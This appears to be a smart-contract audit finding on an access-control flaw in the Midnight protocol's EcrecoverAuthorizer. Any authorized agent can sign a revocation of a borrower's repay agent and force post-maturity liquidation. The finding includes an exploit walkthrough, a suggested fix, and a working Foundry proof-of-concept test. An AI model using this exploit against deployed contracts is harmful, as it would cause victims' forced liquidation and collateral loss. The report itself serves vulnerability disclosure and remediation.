### Title
Authorized agent can deauthorize other authorized agents via `EcrecoverAuthorizer.setIsAuthorized`, enabling forced post-maturity liquidation - ([File: src/periphery/EcrecoverAuthorizer.sol])

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts a signature from any address that is currently authorized by `authorization.authorizer` in Midnight, not only from the authorizer themselves. This means any authorized agent can sign and submit an `Authorization` struct that deauthorizes a different authorized agent (e.g., a repay agent) on behalf of the victim, without the victim's knowledge or consent. If executed just before debt maturity, the victim's repay agent is silently stripped of permission, causing the repay to revert and the position to become liquidatable post-maturity.

### Finding Description
**Code path and root cause:**

In `EcrecoverAuthorizer.setIsAuthorized` (lines 33–36), the signer validity check is:

```solidity
require(
    signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
```

The second branch accepts any `signer` for whom `isAuthorized[authorizer][signer]` is `true`. There is no restriction on what such a delegated signer may do — in particular, it may set `isAuthorized = false` for any `authorized` address, including other agents the victim relies on.

The call then proceeds to:

```solidity
IMidnight(MIDNIGHT).setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
```

In `Midnight.setIsAuthorized` (line 732), the only gate is:

```solidity
require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
```

`msg.sender` here is `EcrecoverAuthorizer`, and `onBehalf` is the victim. This passes as long as `isAuthorized[victim][ecrecoverAuthorizer]` is `true`, which is a necessary precondition for the victim to use the periphery contract at all.

**Attacker-controlled inputs:**
- `authorization.authorizer` = victim address
- `authorization.authorized` = repayAgent address
- `authorization.isAuthorized` = `false`
- `authorization.nonce` = `nonce[victim]` (public storage, readable by anyone)
- `authorization.deadline` = any future timestamp
- `signature` = attacker's own valid ECDSA signature over the above struct

**Exploit flow:**
1. Victim calls `midnight.setIsAuthorized(ecrecoverAuthorizer, true, victim)` — required to use the periphery.
2. Victim calls `midnight.setIsAuthorized(repayAgent, true, victim)` — sets up automated repayment.
3. Victim calls `midnight.setIsAuthorized(attacker, true, victim)` — attacker is authorized for some other purpose (e.g., collateral management, trading).
4. Attacker reads `ecrecoverAuthorizer.nonce(victim)` = N.
5. Attacker constructs `Authorization{authorizer: victim, authorized: repayAgent, isAuthorized: false, nonce: N, deadline: T+1}` and signs it with their own key.
6. Attacker calls `ecrecoverAuthorizer.setIsAuthorized(auth, sig)`.
7. `ecrecover` returns attacker's address; `isAuthorized[victim][attacker]` is `true` → check passes.
8. `midnight.setIsAuthorized(repayAgent, false, victim)` executes; `isAuthorized[victim][repayAgent]` becomes `false`.
9. Attacker warps to or waits for maturity.
10. `repayAgent` calls `midnight.repay(market, amount, victim, ...)` → reverts with `Unauthorized`.
11. Victim's position is not repaid at maturity and becomes liquidatable.

**Why existing checks fail:**
- The nonce check only prevents replay of the same authorization; it does not prevent a fresh deauthorization signed by a different (but authorized) party.
- The deadline check only prevents stale signatures; the attacker sets a fresh deadline.
- `Midnight.setIsAuthorized` delegates the authorization decision entirely to the caller (`EcrecoverAuthorizer`), which has already passed its own check.
- There is no check that the signer is the authorizer themselves when `isAuthorized = false` is being set. [1](#0-0) [2](#0-1) 

### Impact Explanation
A victim borrower relying on an authorized `repayAgent` to call `Midnight.repay` before maturity can have that agent silently deauthorized by any other authorized agent (attacker). The repay call reverts with `Unauthorized`, the debt is not cleared, and the position becomes liquidatable post-maturity. The attacker pays only gas; the victim suffers forced liquidation with associated collateral loss and liquidation penalties.

### Likelihood Explanation
**Preconditions:**
1. Victim has authorized `EcrecoverAuthorizer` in Midnight — required for any use of the periphery contract.
2. Victim has authorized a `repayAgent` — common for automated repayment bots or smart-contract wallets.
3. Victim has authorized the attacker for any other purpose — e.g., a shared operator, a trading agent, or a collateral manager.

All three preconditions are realistic in a multi-agent DeFi setup. The attack is repeatable: even if the victim re-authorizes `repayAgent`, the attacker can deauthorize again using the next nonce (which is again public). The attack is cheap (gas only) and can be timed precisely to the block before maturity.

### Recommendation
Restrict the delegated-signer path in `EcrecoverAuthorizer.setIsAuthorized` so that only the authorizer themselves (i.e., `signer == authorization.authorizer`) may submit deauthorization requests (`isAuthorized = false`). Authorized agents should only be permitted to grant new authorizations on behalf of the authorizer, not revoke existing ones:

```solidity
require(
    signer == authorization.authorizer
        || (authorization.isAuthorized && IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer)),
    Unauthorized()
);
```

Alternatively, remove the delegated-signer path entirely and require the signature to always come from `authorization.authorizer`. [3](#0-2)

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {Authorization, Signature, AUTHORIZATION_TYPEHASH, EIP712_DOMAIN_TYPEHASH}
    from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";
import {IMidnight, Market, CollateralParams} from "../src/interfaces/IMidnight.sol";

contract DeauthorizeRepayAgentPoC is BaseTest {
    function testAttackerDeauthorizesRepayAgent() public {
        // Setup: market with maturity in 100 blocks
        Market memory market;
        market.loanToken = address(loanToken);
        market.maturity = vm.getBlockTimestamp() + 100;
        market.collateralParams.push(CollateralParams({
            token: address(collateralToken1), lltv: 0.77e18,
            maxLif: maxLif(0.77e18, 0.25e18), oracle: address(oracle1)
        }));

        uint256 units = 1000;
        collateralize(market, borrower, units);
        setupMarket(market, units);

        // Borrower (victim) authorizes EcrecoverAuthorizer, repayAgent, and attacker
        address repayAgent = makeAddr("repayAgent");
        (address attacker, uint256 attackerKey) = makeAddrAndKey("attacker");
        privateKey[attacker] = attackerKey;

        vm.startPrank(borrower);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, borrower);
        midnight.setIsAuthorized(repayAgent, true, borrower);
        midnight.setIsAuthorized(attacker, true, borrower);
        vm.stopPrank();

        // Attacker constructs deauthorization for repayAgent, signed by attacker
        uint256 currentNonce = ecrecoverAuthorizer.nonce(borrower);
        Authorization memory auth = Authorization({
            authorizer: borrower,
            authorized: repayAgent,
            isAuthorized: false,
            nonce: currentNonce,
            deadline: vm.getBlockTimestamp() + 1 days
        });
        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, auth));
        bytes32 domainSep = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(ecrecoverAuthorizer)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSep, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerKey, digest);
        Signature memory sig = Signature({v: v, r: r, s: s});

        // Attacker submits deauthorization — no victim consent required
        vm.prank(attacker);
        ecrecoverAuthorizer.setIsAuthorized(auth, sig);

        // Assert repayAgent is now deauthorized
        assertEq(midnight.isAuthorized(borrower, repayAgent), false);

        // Warp to maturity
        vm.warp(market.maturity + 1);

        // repayAgent attempts to repay — reverts with Unauthorized
        deal(address(loanToken), repayAgent, units);
        vm.prank(repayAgent);
        loanToken.approve(address(midnight), units);
        vm.prank(repayAgent);
        vm.expectRevert(IMidnight.Unauthorized.selector);
        midnight.repay(market, units, borrower, address(0), hex"");
        // Position is now liquidatable post-maturity with no repayment
    }
}
```

**Expected assertions:**
- `midnight.isAuthorized(borrower, repayAgent)` is `false` after the attacker's call.
- `midnight.repay(...)` called by `repayAgent` reverts with `Unauthorized`.
- Borrower's debt remains non-zero post-maturity, position is liquidatable. [4](#0-3) [5](#0-4)

```text
    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );
```
